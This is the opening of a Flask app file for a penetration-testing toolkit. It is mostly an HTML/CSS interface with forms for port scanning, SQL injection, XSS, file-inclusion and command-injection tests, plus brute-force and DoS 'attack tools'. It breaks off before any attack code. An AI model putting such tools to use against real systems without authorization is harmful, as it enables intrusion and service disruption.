# app.py - STABLE Advanced Security Scanner with REAL Tools
import os
import socket
import time
import json
import requests
import hashlib
import threading
import random
import string
import ipaddress
import ssl
import base64
import urllib.parse
import concurrent.futures
import subprocess
import re
import urllib3
import struct
import binascii
import ipaddress
import itertools
import sys
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, Response
from flask_cors import CORS
from urllib.parse import urlparse, quote, unquote, urljoin, parse_qs
import http.client
import socks
import dns.resolver
import dns.reversename

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)
CORS(app)
app.secret_key = os.urandom(24)

# Load HTML template from external file for better organization
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚡ STABLE Security Scanner - Real Tools</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #0a0a0a;
            --secondary: #111;
            --terminal: #000;
            --green: #00ff00;
            --cyan: #00ffff;
            --red: #ff0000;
            --yellow: #ffff00;
            --orange: #ff8800;
            --purple: #ff00ff;
            --blue: #0088ff;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: var(--primary);
            color: var(--green);
            font-family: 'Courier New', monospace;
            overflow-x: hidden;
            min-height: 100vh;
        }
        
        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.05;
            pointer-events: none;
        }
        
        .header {
            background: rgba(0, 0, 0, 0.8);
            border-bottom: 2px solid var(--green);
            padding: 20px;
            text-align: center;
            backdrop-filter: blur(10px);
        }
        
        .header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
            color: var(--cyan);
            text-shadow: 0 0 10px var(--cyan);
        }
        
        .header p {
            color: var(--yellow);
            font-size: 1.1em;
        }
        
        .warning-banner {
            background: rgba(255, 0, 0, 0.2);
            border: 1px solid var(--red);
            padding: 15px;
            margin: 20px;
            border-radius: 5px;
            text-align: center;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }
        
        .container {
            display: grid;
            grid-template-columns: 280px 1fr;
            gap: 20px;
            padding: 20px;
            max-width: 1600px;
            margin: 0 auto;
        }
        
        @media (max-width: 1024px) {
            .container {
                grid-template-columns: 1fr;
            }
        }
        
        .sidebar {
            background: rgba(0, 0, 0, 0.8);
            border: 1px solid var(--green);
            border-radius: 10px;
            padding: 20px;
            height: fit-content;
            backdrop-filter: blur(10px);
        }
        
        .tool-category {
            margin-bottom: 25px;
        }
        
        .category-title {
            color: var(--cyan);
            border-bottom: 1px solid #333;
            padding-bottom: 10px;
            margin-bottom: 15px;
            font-size: 1.2em;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .tool-btn {
            display: block;
            width: 100%;
            background: rgba(0, 255, 0, 0.05);
            border: 1px solid #333;
            color: var(--green);
            padding: 12px 15px;
            margin: 8px 0;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            text-align: left;
            border-radius: 5px;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .tool-btn:hover {
            background: rgba(0, 255, 0, 0.1);
            border-color: var(--green);
            transform: translateX(5px);
            box-shadow: 0 5px 15px rgba(0, 255, 0, 0.2);
        }
        
        .tool-btn.active {
            background: rgba(0, 255, 255, 0.1);
            border-color: var(--cyan);
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
        }
        
        .tool-btn.danger {
            border-color: var(--red);
            color: var(--red);
        }
        
        .tool-btn.danger:hover {
            background: rgba(255, 0, 0, 0.1);
            box-shadow: 0 5px 15px rgba(255, 0, 0, 0.2);
        }
        
        .tool-btn.warning {
            border-color: var(--yellow);
            color: var(--yellow);
        }
        
        .main-content {
            background: rgba(0, 0, 0, 0.8);
            border: 1px solid var(--green);
            border-radius: 10px;
            padding: 25px;
            min-height: 800px;
            backdrop-filter: blur(10px);
        }
        
        .tool-section {
            display: none;
            animation: fadeIn 0.5s;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .tool-section.active {
            display: block;
        }
        
        .section-header {
            margin-bottom: 25px;
            padding-bottom: 15px;
            border-bottom: 1px solid #333;
        }
        
        .section-header h2 {
            color: var(--cyan);
            font-size: 1.8em;
            margin-bottom: 10px;
        }
        
        .section-header p {
            color: #aaa;
        }
        
        .form-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-label {
            display: block;
            color: var(--cyan);
            margin-bottom: 8px;
            font-weight: bold;
            font-size: 1.1em;
        }
        
        .form-input, .form-select, .form-textarea {
            width: 100%;
            padding: 12px;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid #333;
            color: var(--green);
            font-family: 'Courier New', monospace;
            border-radius: 5px;
            transition: all 0.3s;
        }
        
        .form-input:focus, .form-select:focus, .form-textarea:focus {
            border-color: var(--cyan);
            outline: none;
            box-shadow: 0 0 15px rgba(0, 255, 255, 0.2);
        }
        
        .btn-group {
            display: flex;
            gap: 15px;
            margin: 25px 0;
            flex-wrap: wrap;
        }
        
        .btn {
            padding: 12px 25px;
            background: rgba(0, 255, 0, 0.1);
            border: 1px solid var(--green);
            color: var(--green);
            cursor: pointer;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            border-radius: 5px;
            transition: all 0.3s;
            display: inline-flex;
            align-items: center;
            gap: 10px;
        }
        
        .btn:hover {
            background: rgba(0, 255, 0, 0.2);
            box-shadow: 0 5px 20px rgba(0, 255, 0, 0.3);
            transform: translateY(-2px);
        }
        
        .btn-danger {
            background: rgba(255, 0, 0, 0.1);
            border-color: var(--red);
            color: var(--red);
        }
        
        .btn-danger:hover {
            background: rgba(255, 0, 0, 0.2);
            box-shadow: 0 5px 20px rgba(255, 0, 0, 0.3);
        }
        
        .btn-warning {
            background: rgba(255, 255, 0, 0.1);
            border-color: var(--yellow);
            color: var(--yellow);
        }
        
        .results-container {
            margin-top: 30px;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid #333;
            border-radius: 10px;
            overflow: hidden;
        }
        
        .results-header {
            background: rgba(0, 20, 0, 0.5);
            padding: 15px;
            border-bottom: 1px solid #333;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .results-body {
            max-height: 500px;
            overflow-y: auto;
            padding: 20px;
        }
        
        .result-item {
            padding: 15px;
            margin: 10px 0;
            background: rgba(0, 0, 0, 0.3);
            border-left: 4px solid var(--green);
            border-radius: 5px;
            animation: slideIn 0.3s;
        }
        
        @keyframes slideIn {
            from { transform: translateX(-10px); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        .result-item.success {
            border-left-color: var(--green);
        }
        
        .result-item.warning {
            border-left-color: var(--yellow);
        }
        
        .result-item.error {
            border-left-color: var(--red);
        }
        
        .result-item.info {
            border-left-color: var(--cyan);
        }
        
        .result-title {
            font-weight: bold;
            color: var(--cyan);
            margin-bottom: 5px;
        }
        
        .result-content {
            color: #ccc;
            font-size: 0.95em;
        }
        
        .console-output {
            background: #000;
            color: var(--green);
            font-family: monospace;
            padding: 15px;
            border-radius: 5px;
            max-height: 400px;
            overflow-y: auto;
            white-space: pre-wrap;
            margin-top: 20px;
        }
        
        .log-entry {
            padding: 5px 0;
            border-bottom: 1px solid #222;
        }
        
        .log-time {
            color: #666;
            margin-right: 10px;
        }
        
        .progress-container {
            margin: 20px 0;
        }
        
        .progress-bar {
            height: 8px;
            background: #333;
            border-radius: 4px;
            overflow: hidden;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--green), var(--cyan));
            width: 0%;
            transition: width 0.3s;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin: 25px 0;
        }
        
        .stat-card {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid #333;
            border-radius: 8px;
            padding: 20px;
            text-align: center;
        }
        
        .stat-value {
            font-size: 2em;
            color: var(--cyan);
            font-weight: bold;
        }
        
        .stat-label {
            color: #666;
            font-size: 0.9em;
            margin-top: 5px;
        }
        
        .loading {
            text-align: center;
            padding: 40px;
            color: var(--yellow);
        }
        
        .spinner {
            border: 4px solid rgba(0, 255, 255, 0.1);
            border-left-color: var(--cyan);
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .footer {
            text-align: center;
            padding: 20px;
            border-top: 1px solid #333;
            margin-top: 40px;
            color: #666;
            font-size: 0.9em;
        }
        
        .tab-container {
            display: flex;
            border-bottom: 1px solid #333;
            margin-bottom: 20px;
        }
        
        .tab {
            padding: 12px 25px;
            background: none;
            border: none;
            color: #666;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            border-bottom: 2px solid transparent;
            transition: all 0.3s;
        }
        
        .tab:hover {
            color: var(--green);
        }
        
        .tab.active {
            color: var(--cyan);
            border-bottom-color: var(--cyan);
        }
        
        .tab-content {
            display: none;
        }
        
        .tab-content.active {
            display: block;
        }
        
        .checkbox-group {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 10px;
            margin: 15px 0;
        }
        
        .checkbox-label {
            display: flex;
            align-items: center;
            gap: 10px;
            color: #ccc;
            cursor: pointer;
        }
        
        .checkbox-label input[type="checkbox"] {
            accent-color: var(--green);
        }
        
        .port-list {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
            gap: 10px;
            margin-top: 15px;
        }
        
        .port-item {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid #333;
            padding: 10px;
            text-align: center;
            border-radius: 5px;
            transition: all 0.3s;
        }
        
        .port-item.open {
            border-color: var(--green);
            background: rgba(0, 255, 0, 0.1);
        }
        
        .port-item:hover {
            transform: scale(1.05);
        }
        
        .alert {
            padding: 15px;
            border-radius: 5px;
            margin: 15px 0;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .alert-success {
            background: rgba(0, 255, 0, 0.1);
            border: 1px solid var(--green);
            color: var(--green);
        }
        
        .alert-warning {
            background: rgba(255, 255, 0, 0.1);
            border: 1px solid var(--yellow);
            color: var(--yellow);
        }
        
        .alert-danger {
            background: rgba(255, 0, 0, 0.1);
            border: 1px solid var(--red);
            color: var(--red);
        }
        
        .tooltip {
            position: relative;
            display: inline-block;
        }
        
        .tooltip .tooltiptext {
            visibility: hidden;
            width: 200px;
            background-color: #000;
            color: var(--green);
            text-align: center;
            border-radius: 6px;
            padding: 10px;
            position: absolute;
            z-index: 1;
            bottom: 125%;
            left: 50%;
            margin-left: -100px;
            border: 1px solid var(--green);
            opacity: 0;
            transition: opacity 0.3s;
        }
        
        .tooltip:hover .tooltiptext {
            visibility: visible;
            opacity: 1;
        }
    </style>
</head>
<body>
    <canvas id="matrixCanvas" class="matrix-bg"></canvas>
    
    <div class="header">
        <h1><i class="fas fa-shield-alt"></i> STABLE SECURITY SCANNER</h1>
        <p>Advanced Penetration Testing Toolkit | Real Working Tools | Charlie Syllas & Jaguar 45 ©2026</p>
    </div>
    
    <div class="warning-banner">
        <i class="fas fa-exclamation-triangle"></i>
        <strong>WARNING:</strong> This tool performs REAL security tests. Use only on systems you own or have explicit written authorization to test.
    </div>
    
    <div class="container">
        <div class="sidebar">
            <div class="tool-category">
                <div class="category-title"><i class="fas fa-search"></i> RECONNAISSANCE</div>
                <button class="tool-btn active" onclick="showTool('infoGathering')">
                    <i class="fas fa-info-circle"></i> Info Gathering
                </button>
                <button class="tool-btn" onclick="showTool('portScanner')">
                    <i class="fas fa-network-wired"></i> Port Scanner
                </button>
                <button class="tool-btn" onclick="showTool('dnsEnum')">
                    <i class="fas fa-globe"></i> DNS Enumeration
                </button>
                <button class="tool-btn" onclick="showTool('subdomain')">
                    <i class="fas fa-sitemap"></i> Subdomain Finder
                </button>
                <button class="tool-btn" onclick="showTool('dirScanner')">
                    <i class="fas fa-folder"></i> Directory Scanner
                </button>
            </div>
            
            <div class="tool-category">
                <div class="category-title"><i class="fas fa-bug"></i> VULNERABILITY SCANNING</div>
                <button class="tool-btn" onclick="showTool('vulnScanner')">
                    <i class="fas fa-shield-alt"></i> Vulnerability Scan
                </button>
                <button class="tool-btn warning" onclick="showTool('sqliScanner')">
                    <i class="fas fa-database"></i> SQL Injection
                </button>
                <button class="tool-btn warning" onclick="showTool('xssScanner')">
                    <i class="fas fa-code"></i> XSS Scanner
                </button>
                <button class="tool-btn warning" onclick="showTool('lfiScanner')">
                    <i class="fas fa-file"></i> LFI/RFI Scanner
                </button>
                <button class="tool-btn warning" onclick="showTool('cmdScanner')">
                    <i class="fas fa-terminal"></i> Command Injection
                </button>
            </div>
            
            <div class="tool-category">
                <div class="category-title"><i class="fas fa-bomb"></i> ATTACK TOOLS</div>
                <button class="tool-btn danger" onclick="showTool('bruteForce')">
                    <i class="fas fa-key"></i> Password Bruteforce
                </button>
                <button class="tool-btn danger" onclick="showTool('dosTool')">
                    <i class="fas fa-bolt"></i> DoS Attack Tool
                </button>
                <button class="tool-btn danger" onclick="showTool('sshBrute')">
                    <i class="fas fa-lock"></i> SSH Bruteforce
                </button>
                <button class="tool-btn danger" onclick="showTool('ftpBrute')">
                    <i class="fas fa-server"></i> FTP Bruteforce
                </button>
                <button class="tool-btn danger" onclick="showTool('crawler')">
                    <i class="fas fa-spider"></i> Web Crawler
                </button>
            </div>
            
            <div class="tool-category">
                <div class="category-title"><i class="fas fa-tools"></i> UTILITIES</div>
                <button class="tool-btn" onclick="showTool('hashTools')">
                    <i class="fas fa-hashtag"></i> Hash Tools
                </button>
                <button class="tool-btn" onclick="showTool('encoder')">
                    <i class="fas fa-code"></i> Encoder/Decoder
                </button>
                <button class="tool-btn" onclick="showTool('networkTools')">
                    <i class="fas fa-wifi"></i> Network Tools
                </button>
                <button class="tool-btn" onclick="showTool('headers')">
                    <i class="fas fa-heading"></i> Header Analyzer
                </button>
            </div>
            
            <div class="stats-grid" style="margin-top: 30px;">
                <div class="stat-card">
                    <div class="stat-value" id="activeScans">0</div>
                    <div class="stat-label">Active Scans</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="foundVulns">0</div>
                    <div class="stat-label">Vulns Found</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="uptime">00:00</div>
                    <div class="stat-label">Uptime</div>
                </div>
            </div>
        </div>
        
        <div class="main-content">
            <!-- Info Gathering -->
            <div id="infoGathering" class="tool-section active">
                <div class="section-header">
                    <h2><i class="fas fa-info-circle"></i> Information Gathering</h2>
                    <p>Collect comprehensive intelligence about target</p>
                </div>
                
                <div class="form-grid">
                    <div class="form-group">
                        <label class="form-label">Target Domain/IP:</label>
                        <input type="text" id="infoTarget" class="form-input" placeholder="example.com or 192.168.1.1" value="example.com">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Scan Type:</label>
                        <select id="infoType" class="form-select">
                            <option value="basic">Basic Recon</option>
                            <option value="advanced">Advanced Recon</option>
                            <option value="full">Full Recon</option>
                        </select>
                    </div>
                </div>
                
                <div class="checkbox-group">
                    <label class="checkbox-label">
                        <input type="checkbox" id="infoDNS" checked>
                        <span>DNS Records</span>
                    </label>
                    <label class="checkbox-label">
                        <input type="checkbox" id="infoPorts" checked>
                        <span>Port Scan</span>
                    </label>
                    <label class="checkbox-label">
                        <input type="checkbox" id="infoWhois" checked>
                        <span>WHOIS Lookup</span>
                    </label>
                    <label class="checkbox-label">
                        <input type="checkbox" id="infoTech" checked>
                        <span>Technology Detection</span>
                    </label>
                    <label class="checkbox-label">
                        <input type="checkbox" id="infoSSL" checked>
                        <span>SSL/TLS Info</span>
                    </label>
                </div>
                
                <div class="btn-group">
                    <button class="btn" onclick="startInfoGathering()">
                        <i class="fas fa-search"></i> Start Reconnaissance
                    </button>
                    <button class="btn" onclick="clearResults('infoResults')">
                        <i class="fas fa-trash"></i> Clear Results
                    </button>
                </div>
                
                <div class="results-container">
                    <div class="results-header">
                        <span>Reconnaissance Results</span>
                        <span id="infoStatus">Ready</span>
                    </div>
                    <div class="results-body" id="infoResults">
                        <!-- Results will appear here -->
                    </div>
                </div>
            </div>
            
            <!-- Port Scanner -->
            <div id="portScanner" class="tool-section">
                <div class="section-header">
                    <h2><i class="fas fa-network-wired"></i> Port Scanner</h2>
                    <p>Scan for open ports and services</p>
                </div>
                
                <div class="form-grid">
                    <div class="form-group">
                        <label class="form-label">Target:</label>
                        <input type="text" id="portTarget" class="form-input" placeholder="example.com or 192.168.1.1">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Scan Type:</label>
                        <select id="portType" class="form-select">
                            <option value="quick">Quick Scan (Top 100)</option>
                            <option value="common">Common Ports</option>
                            <option value="full">Full Scan (1-1000)</option>
                            <option value="stealth">Stealth Scan</option>
                            <option value="udp">UDP Scan</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Custom Port Range:</label>
                        <input type="text" id="portRange" class="form-input" placeholder="1-1000 (optional)">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Timeout (seconds):</label>
                        <input type="number" id="portTimeout" class="form-input" value="2" min="1" max="10">
                    </div>
                </div>
                
                <div class="btn-group">
                    <button class="btn" onclick="startPortScan()">
                        <i class="fas fa-play"></i> Start Port Scan
                    </button>
                    <button class="btn-danger" onclick="stopScan('port')">
                        <i class="fas fa-stop"></i> Stop Scan
                    </button>
                </div>
                
                <div class="progress-container">
                    <div class="progress-bar">
                        <div class="progress-fill" id="portProgress"></div>
                    </div>
                </div>
                
                <div class="results-container">
                    <div class="results-header">
                        <span>Port Scan Results</span>
                        <span id="portStatus">Ready</span>
                    </div>
                    <div class="results-body" id="portResults">
                        <!-- Results will appear here -->
                    </div>
                </div>
            </div>
            
            <!-- DNS Enumeration -->
            <div id="dnsEnum" class="tool-section">
                <div class="section-header">
                    <h2><i class="fas fa-globe"></i> DNS Enumeration</h2>
                    <p>Gather DNS information and records</p>
                </div>
                
                <div class="form-grid">
                    <div class="form-group">
                        <label class="form-label">Domain:</label>
                        <input type="text" id="dnsTarget" class="form-input" placeholder="example.com" value="example.com">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Record Types:</label>
                        <select id="dnsTypes" class="form-select" multiple style="height: 120px;">
                            <option value="A" selected>A (Address)</option>
                            <option value="AAAA" selected>AAAA (IPv6 Address)</option>
                            <option value="MX" selected>MX (Mail Exchange)</option>
                            <option value="NS" selected>NS (Name Server)</option>
                            <option value="TXT" selected>TXT (Text)</option>
                            <option value="CNAME">CNAME (Canonical Name)</option>
                            <option value="SOA">SOA (Start of Authority)</option>
                            <option value="PTR">PTR (Pointer)</option>
                            <option value="SRV">SRV (Service)</option>
                        </select>
                    </div>
                </div>
                
                <div class="btn-group">
                    <button class="btn" onclick="startDNSEnum()">
                        <i class="fas fa-search"></i> Enumerate DNS
                    </button>
                    <button class="btn" onclick="startReverseDNS()">
                        <i class="fas fa-exchange-alt"></i> Reverse DNS
                    </button>
                </div>
                
                <div class="results-container">
                    <div class="results-header">
                        <span>DNS Enumeration Results</span>
                        <span id="dnsStatus">Ready</span>
                    </div>
                    <div class="results-body" id="dnsResults">
                        <!-- Results will appear here -->
                    </div>
                </div>
            </div>
            
            <!-- Subdomain Finder -->
            <div id="subdomain" class="tool-section">
                <div class="section-header">
                    <h2><i class="fas fa-sitemap"></i> Subdomain Finder</h2>
                    <p>Discover subdomains using various techniques</p>
                </div>
                
                <div class="form-grid">
                    <div class="form-group">
                        <label class="form-label">Domain:</label>
                        <input type="text" id="subTarget" class="form-input" placeholder="example.com" value="example.com">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Wordlist:</label>
                        <select id="subWordlist" class="form-select">
                            <option value="small">Small (100 subdomains)</option>
                            <option value="medium" selected>Medium (500 subdomains)</option>
                            <option value="large">Large (2000 subdomains)</option>
                            <option value="huge">Huge (10000 subdomains)</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Threads:</label>
                        <input type="number" id="subThreads" class="form-input" value="50" min="1" max="200">
                    </div>
                </div>
                
                <div class="btn-group">
                    <button class="btn" onclick="startSubdomainScan()">
                        <i class="fas fa-search"></i> Find Subdomains
                    </button>
                    <button class="btn" onclick="checkSubdomains()">
                        <i class="fas fa-check"></i> Check Live Subdomains
                    </button>
                </div>
                
                <div class="results-container">
                    <div class="results-header">
                        <span>Subdomain Results</span>
                        <span id="subStatus">Ready</span>
                    </div>
                    <div class="results-body" id="subResults">
                        <!-- Results will appear here -->
                    </div>
                </div>
            </div>
            
            <!-- Directory Scanner -->
            <div id="dirScanner" class="tool-section">
                <div class="section-header">
                    <h2><i class="fas fa-folder"></i> Directory Scanner</h2>
                    <p>Bruteforce directories and files</p>
                </div>
                
                <div class="form-grid">
                    <div class="form-group">
                        <label class="form-label">URL:</label>
                        <input type="text" id="dirTarget" class="form-input" placeholder="http://example.com" value="http://example.com">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Wordlist:</label>
                        <select id="dirWordlist" class="form-select">
                            <option value="small">Small (1000 entries)</option>
                            <option value="medium" selected>Medium (5000 entries)</option>
                            <option value="large">Large (20000 entries)</option>
                            <option value="dirb">Dirb Common (4600 entries)</option>
                            <option value="dirbuster">Dirbuster (22000 entries)</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Extensions:</label>
                        <input type="text" id="dirExtensions" class="form-input" placeholder="php,html,txt (comma separated)">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Threads:</label>
                        <input type="number" id="dirThreads" class="form-input" value="20" min="1" max="100">
                    </div>
                </div>
                
                <div class="btn-group">
                    <button class="btn" onclick="startDirScan()">
                        <i class="fas fa-play"></i> Start Directory Scan
                    </button>
                    <button class="btn-danger" onclick="stopScan('dir')">
                        <i class="fas fa-stop"></i> Stop Scan
                    </button>
                </div>
                
                <div class="progress-container">
                    <div class="progress-bar">
                        <div class="progress-fill" id="dirProgress"></div>
                    </div>
                </div>
                
                <div class="results-container">
                    <div class="results-header">
                        <span>Directory Scan Results</span>
                        <span id="dirStatus">Ready</span>
                    </div>
                    <div class="results-body" id="dirResults">
                        <!-- Results will appear here -->
                    </div>
                </div>
            </div>
            
            <!-- Vulnerability Scanner -->
            <div id="vulnScanner" class="tool-section">
                <div class="section-header">
                    <h2><i class="fas fa-shield-alt"></i> Vulnerability Scanner</h2>
                    <p>Comprehensive web vulnerability assessment</p>
                </div>
                
                <div class="form-grid">
                    <div class="form-group">
                        <label class="form-label">Target URL:</label>
                        <input type="text" id="vulnTarget" class="form-input" placeholder="http://example.com" value="http://example.com">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Scan Depth:</label>
                        <select id="vulnDepth" class="form-select">
                            <option value="basic">Basic Scan</option>
                            <option value="standard" selected>Standard Scan</option>
                            <option value="deep">Deep Scan</option>
                            <option value="aggressive">Aggressive Scan</option>
                        </select>
                    </div>
                </div>
                
                <div class="checkbox-group">
                    <label class="checkbox-label">
                        <input type="checkbox" id="vulnSqli" checked>
                        <span>SQL Injection</span>
                    </label>
                    <label class="checkbox-label">
                        <input type="checkbox" id="vulnXss" checked>
                        <span>Cross-Site Scripting (XSS)</span>
                    </label>
                    <label class="checkbox-label">
                        <input type="checkbox" id="vulnLfi" checked>
                        <span>LFI/RFI</span>
                    </label>
                    <label class="checkbox-label">
                        <input type="checkbox" id="vulnCmd" checked>
                        <span>Command Injection</span>
                    </label>
                    <label class="checkbox-label">
                        <input type="checkbox" id="vulnHeaders" checked>
                        <span>Security Headers</span>
                    </label>
                    <label class="checkbox-label">
                        <input type="checkbox" id="vulnSsl" checked>
                        <span>SSL/TLS Issues</span>
                    </label>
                    <label class="checkbox-label">
                        <input type="checkbox" id="vulnXxe" checked>
                        <span>XXE Injection</span>
                    </label>
                    <label class="checkbox-label">
                        <input type="checkbox" id="vulnSsrf" checked>
                        <span>SSRF</span>
                    </label>
                </div>
                
                <div class="btn-group">
                    <button class="btn" onclick="startVulnScan()">
                        <i class="fas fa-search"></i> Start Vulnerability Scan
                    </button>
                </div>
                
                <div class="results-container">
                    <div class="results-header">
                        <span>Vulnerability Scan Results</span>
                        <span id="vulnStatus">Ready</span>
                    </div>
                    <div class="results-body" id="vulnResults">
                        <!-- Results will appear here -->
                    </div>
                </div>
            </div>
            
            <!-- SQL Injection Scanner -->
            <div id="sqliScanner" class="tool-section">
                <div class="section-header">
                    <h2><i class="fas fa-database"></i> SQL Injection Scanner</h2>
                    <p>Detect SQL injection vulnerabilities</p>
                </div>
                
                <div class="alert alert-warning">
                    <i class="fas fa-exclamation-triangle"></i>
                    This tool performs REAL SQL injection tests. Use responsibly.
                </div>
                
                <div class="form-grid">
                    <div class="form-group">
                        <label class="form-label">Target URL:</label>
                        <input type="text" id="sqliTarget" class="form-input" placeholder="http://example.com/page.php?id=1" value="http://testphp.vulnweb.com/artists.php?artist=1">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Test Method:</label>
                        <select id="sqliMethod" class="form-select">
                            <option value="error">Error-Based</option>
                            <option value="boolean">Boolean-Based</option>
                            <option value="time">Time-Based</option>
                            <option value="union">Union-Based</option>
                            <option value="stacked">Stacked Queries</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Database Type:</label>
                        <select id="sqliDB" class="form-select">
                            <option value="auto">Auto Detect</option>
                            <option value="mysql">MySQL</option>
                            <option value="mssql">MSSQL</option>
                            <option value="oracle">Oracle</option>
                            <option value="postgresql">PostgreSQL</option>
                            <option value="sqlite">SQLite</option>
                        </select>
                    </div>
                </div>
                
                <div class="btn-group">
                    <button class="btn-warning" onclick="startSqliScan()">
                        <i class="fas fa-bug"></i> Test for SQL Injection
                    </button>
                    <button class="btn-danger" onclick="exploitSqli()">
                        <i class="fas fa-skull"></i> Advanced Exploitation
                    </button>
                </div>
                
                <div class="console-output" id="sqliConsole">
                    <!-- Console output will appear here -->
                </div>
            </div>
            
            <!-- XSS Scanner -->
            <div id="xssScanner" class="tool-section">
                <div class="section-header">
                    <h2><i class="fas fa-code"></i> XSS Scanner</h2>
                    <p>Detect Cross-Site Scripting vulnerabilities</p>
                </div>
                
                <div class="form-grid">
                    <div class="form-group">
                        <label class="form-label">Target URL:</label>
                        <input type="text" id="xssTarget" class="form-input" placeholder="http://example.com/search?q=test" value="http://testphp.vulnweb.com/search.php?test=query">
                    </div>
                    <div class="form-group">
                        <label class="form-label">XSS Type:</label>
                        <select id="xssType" class="form-select">
                            <option value="all">All Types</option>
                            <option value="reflected">Reflected XSS</option>
                            <option value="stored">Stored XSS</option>
                            <option value="dom">DOM XSS</option>
                            <option value="blind">Blind XSS</option>
                        </select>
                    </div>
                </div>
                
                <div class="btn-group">
                    <button class="btn-warning" onclick="startXssScan()">
                        <i class="fas fa-bug"></i> Test for XSS
                    </button>
                </div>
                
                <div class="console-output" id="xssConsole">
                    <!-- Console output will appear here -->
                </div>
            </div>
            
            <!-- LFI/RFI Scanner -->
            <div id="lfiScanner" class="tool-section">
                <div class="section-header">
                    <h2><i class="fas fa-file"></i> LFI/RFI Scanner</h2>
                    <p>Detect Local and Remote File Inclusion vulnerabilities</p>
                </div>
                
                <div class="form-grid">
                    <div class="form-group">
                        <label class="form-label">Target URL:</label>
                        <input type="text" id="lfiTarget" class="form-input" placeholder="http://example.com/page?file=index.php">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Test Type:</label>
                        <select id="lfiType" class="form-select">
                            <option value="both">LFI & RFI</option>
                            <option value="lfi">LFI Only</option>
                            <option value="rfi">RFI Only</option>
                            <option value="php">PHP Wrappers</option>
                        </select>
                    </div>
                </div>
                
                <div class="btn-group">
                    <button class="btn-warning" onclick="startLfiScan()">
                        <i class="fas fa-bug"></i> Test for LFI/RFI
                    </button>
                </div>
                
                <div class="console-output" id="lfiConsole">
                    <!-- Console output will appear here -->
                </div>
            </div>
            
            <!-- Command Injection Scanner -->
            <div id="cmdScanner" class="tool-section">
                <div class="section-header">
                    <h2><i class="fas fa-terminal"></i> Command Injection Scanner</h2>
                    <p>Detect OS command injection vulnerabilities</p>
                </div>
                
                <div class="alert alert-danger">
                    <i class="fas fa-skull-crossbones"></i>
                    This tool can execute REAL system commands. Use with extreme caution.
                </div>
                
                <div class="form-grid">
                    <div class="form-group">
                        <label class="form-label">Target URL:</label>
                        <input type="text" id="cmdTarget" class="form-input" placeholder="http://example.com/ping?ip=127.0.0.1">
                    </div>
                    <div class="form-group">
                        <label class="form-label">OS Type:</label>
                        <select id="cmdOS" class="form-select">
                            <option value="auto">Auto Detect</option>
                            <option value="linux">Linux/Unix</option>
                            <option value="windows">Windows</option>
                        </select>
                    </div>
                </div>
                
                <div class="btn-group">
                    <button class="btn-danger" onclick="startCmdScan()">
                        <i class="fas fa-bug"></i> Test for Command Injection
                    </button>
                </div>
                
                <div class="console-output" id="cmdConsole">
                    <!-- Console output will appear here -->
                </div>
            </div>
            
            <!-- Password Bruteforce -->
            <div id="bruteForce" class="tool-section">
                <div class="section-header">
                    <h2><i class="fas fa-key"></i> Password Bruteforce</h2>
                    <p>Bruteforce login forms and authentication</p>
                </div>
                
                <div class="alert alert-danger">
                    <i class="fas fa-exclamation-triangle"></i>
                    REAL brute force attacks. AUTHORIZED USE ONLY.
                </div>
                
                <div class="tab-container">
                    <button class="tab active" onclick="showBruteTab('http')">HTTP Form</button>
